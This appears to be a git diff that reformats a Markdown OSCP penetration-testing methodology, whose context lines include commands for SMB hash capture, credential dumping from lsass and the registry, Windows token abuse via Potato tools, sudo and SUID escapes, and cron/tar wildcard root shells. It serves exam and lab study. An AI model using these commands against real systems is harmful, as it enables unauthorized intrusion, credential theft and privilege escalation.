@@ -1,6 +1,6 @@
 # OSCP & Methodology
 
-*The following sequence should be followed accordingly if applicable to conduct an oragnaized penetration test to avoid rabbit holes for the OSCP*
+_The following sequence should be followed accordingly if applicable to conduct an oragnaized penetration test to avoid rabbit holes for the OSCP._
 
 ## Pre-Foothold Testing
 
@@ -22,19 +22,19 @@ Add domain or hostname to Kali /etc/hosts file and review landing page /
 
 #### General Scoping
 
-- Discover Potential Filename patterns for custom bruteforcing directories and files.
-- Discover usernames or email addresses with exiftool after downloading.
-- Discover HTTP Server Version.
-- Discover JavaScript Version.
-- Search For JavaScript Known Version Vulnerabilities.
-- Discover Web Application Name.
-- Discover Web Application Version.
-- Search For Web Application Known Version Vulnerabilities.
-- check certificate if applicable.
-- Discover Admin Login pages.
-- Test For default credentials.
-- Discover User Logins.
-- Discover User Registrations.
+* Discover Potential Filename patterns for custom bruteforcing directories and files.
+* Discover usernames or email addresses with exiftool after downloading.
+* Discover HTTP Server Version.
+* Discover JavaScript Version.
+* Search For JavaScript Known Version Vulnerabilities.
+* Discover Web Application Name.
+* Discover Web Application Version.
+* Search For Web Application Known Version Vulnerabilities.
+* check certificate if applicable.
+* Discover Admin Login pages.
+* Test For default credentials.
+* Discover User Logins.
+* Discover User Registrations.
 
 #### Bruteforce Directories and Files
 
@@ -74,13 +74,14 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names
 
 #### Retrieve Response Headers
 
-Search headers such as *X-Powered-By*. This may reveal vulnerble versioning 
+Search headers such as _X-Powered-By_. This may reveal vulnerble versioning
 
 ```
 curl -I http://$ip/
 ```
 
 #### Run Nikto Vulnerability Scanner
+
 ```
 nikto -h http://$ip
 ```
@@ -93,7 +94,7 @@ nikto -h http://$ip
 
 #### SQL injection
 
-##### Authentication Bypass
+**Authentication Bypass**
 
 Manually confirm the results to then filter out unwanted responses by using --hh
 
@@ -142,7 +143,6 @@ python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\t
 smbclient -N -L //$ip/
 ```
 
-
 ```
 cme smb $ip --shares -u "guest" -p ""
 ```
@@ -151,7 +151,7 @@ cme smb $ip --shares -u "guest" -p ""
 
 Test for URL File attacks by creating a file called "@somename.url" with the following contents, upload, spin up smbserver to capture hash
 
-```conf
+```
 [InternetShortcut]
 URL=blah
 WorkingDirectory=blah
@@ -189,7 +189,7 @@ search lsass.zip or lsass.dmp to use to dump credentials / keys / tickets
 pypykatz lsa minidump "lsass.zip"
 ```
 
-#### Alternate Data Streams (ADS) 
+#### Alternate Data Streams (ADS)
 
 Test for alternate data streams after discovering 0 byte files
 
@@ -258,7 +258,7 @@ Rescursively download files via ftp
 wget -r ftp://user:pass@ip/
 ```
 
-If you find password-protected zip files use zip2john followed by john the hash*
+If you find password-protected zip files use zip2john followed by john the hash\*
 
 ```
 zip2john file.zip >> hashes.txt
@@ -269,11 +269,11 @@ john hashes.txt
 
 If ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.
 
-#### ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
+#### ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution
 
 #### Meta Data
 
-Extract meta data and may contain email addresses*
+Extract meta data and may contain email addresses\*
 
 ```
 exiftool file
@@ -301,7 +301,7 @@ ldapenum -d $domain
 ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
 ```
 
-#### Test for UF_DONT_REQUIRE_PREAUTH
+#### Test for UF\_DONT\_REQUIRE\_PREAUTH
 
 ```
 GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
@@ -312,7 +312,6 @@ GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
 ```
 kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
 ```
-
 
 ## Windows Post-Foothold Testing
 
@@ -347,7 +346,8 @@ runas /savecred /user:someuser whoami.exe
 whoami /priv
 ```
 
-##### SeBackupPrivilege
+**SeBackupPrivilege**
+
 ```
 reg.exe save hklm\sam sam.save
 ```
@@ -360,7 +360,8 @@ reg.exe save hklm\system system.save
 secretsdump.py -sam sam.save -system system.save local
 ```
 
-##### SeRestorePrivilege
+**SeRestorePrivilege**
+
 ```
 SeRestoreAbuse.exe "cmd /c net user thescriptkid thescriptkid /add"
 ```
@@ -373,9 +374,9 @@ SeRestoreAbuse.exe "cmd /c net localgroup administrators thescriptkid /add"
 secretsdump.py domain.local/user:password@$ip
 ```
 
-##### SeImpersonatePrivilege OR SeAssignPrimaryToken
+**SeImpersonatePrivilege OR SeAssignPrimaryToken**
 
-###### RoguePotato 
+**RoguePotato**
 
 If the machine is >= Windows 10 1809 & Windows Server 2019
 
@@ -387,38 +388,39 @@ socat tcp-listen:135,reuseaddr,fork tcp:Windowsip:9999
 RoguePotato.exe -r Kali-ip -e "C:\full\path\to\malicious.exe" -l 9999
 ```
 
-###### JuicyPotato
+**JuicyPotato**
 
-If the machine is < Windows 10 1809 < Windows Server 2019*
+If the machine is < Windows 10 1809 < Windows Server 2019\*
 
 ```
 juicypotato.exe -l 1337 -p c:\full\path\to\malicious.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} OR {4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
-###### PrintSpoofer
+**PrintSpoofer**
+
 ```
 printspoofer.exe -c "C:\full\path\to\malicious.exe" -i
 ```
 
-###### HotPotato 
+**HotPotato**
 
 Windows 7, 8, 10, Server 2008, and Server 2012
 
-##### SeDebugPrivilege
+**SeDebugPrivilege**
 
-##### SeShutdownPrivilege
+**SeShutdownPrivilege**
 
 ```
 shutdown /r /t 0
 ```
 
-##### SeTakeOwndershipPrivilege
+**SeTakeOwndershipPrivilege**
 
 ### Test For Plaintext passwords
 
 #### In Unattended Files
 
-``` 
+```
 type C:\Windows\Panther\Unattended.xml
 ```
 
@@ -428,7 +430,7 @@ type C:\Windows\Panther\Unattend\Unattended.xml
 
 #### In Registries
 
-``` 
+```
 reg query HKLM /f password /t REG_SZ /s
 ```
 
@@ -438,19 +440,19 @@ reg query HKCU /f password /t REG_SZ /s
 
 #### In WinLogon
 
-``` 
+```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
 
 #### In SNMP Paraemeters
 
-``` 
+```
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 ```
 
 #### In Sticky Notes
 
-``` 
+```
 type C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 ```
 
@@ -462,25 +464,25 @@ powershell -command "Get-Clipboard"
 
 #### In VNC
 
-``` 
+```
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 ```
 
 #### In Putty
 
-``` 
+```
 reg query HKEY_CURRENT_USER\Software\%username%\Putty\Sessions\ /f "Proxy" /s
 ```
 
 #### In Powershell History
 
-``` 
+```
 type $home\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 #### In IIS WebServer configs
 
-``` 
+```
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
@@ -490,7 +492,7 @@ type C:\inetpub\wwwroot\web.config | findstr connectionString
 
 #### In WebServer Directories
 
-``` 
+```
 findstr /si password *.txt *.ini *.config *.php *.pl *.xml *.xls *.xlsx *.csv *.doc *.docx
 ```
 
@@ -498,7 +500,7 @@ findstr /si password *.txt *.ini *.config *.php *.pl *.xml *.xls *.xlsx *.csv *.
 
 Both must queryies must return `0x1`
 
-``` 
+```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 ```
 
@@ -515,6 +517,7 @@ msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
 ```
 
 ### Test For AutoRuns
+
 ```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
@@ -559,7 +562,6 @@ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match
 accesschk.exe -uws "Everyone" "C:\Program Files"
 ```
 
-
 ### Test Services
 
 ```
@@ -573,8 +575,9 @@ accesschk.exe /accepteula -uwcqv someuser *
 ```
 sc.exe qc someservice
 ```
- 
+
 #### Insecure Service Executables
+
 ```
 accesschk.exe -ulvqws everyone "C:\program files"
 ```
@@ -620,7 +623,7 @@ icacls C:\path\to\this.exe /grant Everyone:F
 ```
 sc stop/start OR shutdown /r /t 0
 ```
-  
+
 #### Insecure Service Permissions
 
 ```
@@ -663,7 +666,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regservice /v ImagePath /t REG_EX
 
 ### Test For Scheduled Tasks
 
-``` 
+```
 schtasks /query /fo list /v | findstr /c:"User:" /c:"Run:" /c:"TaskName:" /c:"Start Time:" /c:"Last Run Time:" /c:"Start Time:"
 ```
 
@@ -705,7 +708,6 @@ tasklist /V
 
 Research for ways to potentially open a cmd prompt
 
-
 ### Vulnerable Driver Software Discovery
 
 List All Drivers
@@ -721,7 +723,7 @@ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,
 DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
-### Windows Active Directory 
+### Windows Active Directory
 
 #### Overpass The Hash
 
@@ -851,9 +853,9 @@ get libata driver information and version
 modinfo libata
 ```
 
-### Test SUDO 
+### Test SUDO
 
-Reference https://gtfobins.github.io/ 
+Reference https://gtfobins.github.io/
 
 #### Nano
 
@@ -879,7 +881,8 @@ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
 sudo vim -c '!sh'
 ```
 
-#### LD_PRELOAD
+#### LD\_PRELOAD
+
 create file as malicious.c
 
 ```c
@@ -946,7 +949,7 @@ gcc -shared -o /home/user/.config/foundso.so -fPIC /home/user/.config/foundso.c
 sudo apache2 -f /etc/shadow
 ```
 
-### Test SUID files 
+### Test SUID files
 
 Reference https://gtfobins.github.io/ and google the rest not listed.
 
@@ -1024,12 +1027,11 @@ chmod 400 id_rsa
 ssh -i id_rsa someuser@$ip
 ```
 
-
 ### Abusing Intended Functionality
 
-##### Symlinks
+**Symlinks**
 
-###### Nginx below 1.6.2-5+deb8u3 [logrotate Local Privilege Escalation](https://www.exploit-db.com/exploits/40768)
+**Nginx below 1.6.2-5+deb8u3** [**logrotate Local Privilege Escalation**](https://www.exploit-db.com/exploits/40768)
 
 ### Environment Variables
 
@@ -1119,7 +1121,6 @@ cat /etc/crontab
 
 This abuses misconfigured path in "/etc/crontab". If a user has write permissions in the directory that is in the path. create a file with the same name as the cronjob with malicious contents.
 
-
 ```
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /writeable/directory/somefile
 ```
@@ -1138,9 +1139,9 @@ chmod +x /wrietable/directory/somefile
 cat /etc/crontab
 ```
 
-##### Tar
+**Tar**
 
-Exploitable if cronjob script that is using tar and has a wildcard * Example: tar czf /tmp/backup.tar.gz *
+Exploitable if cronjob script that is using tar and has a wildcard \* Example: tar czf /tmp/backup.tar.gz \*
 
 ```
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
@@ -1204,6 +1205,7 @@ chmod +s /tmp/1/thescriptkid
 ```
 
 Victim Machine
+
 ```
 /tmp/thescriptkid
 ```
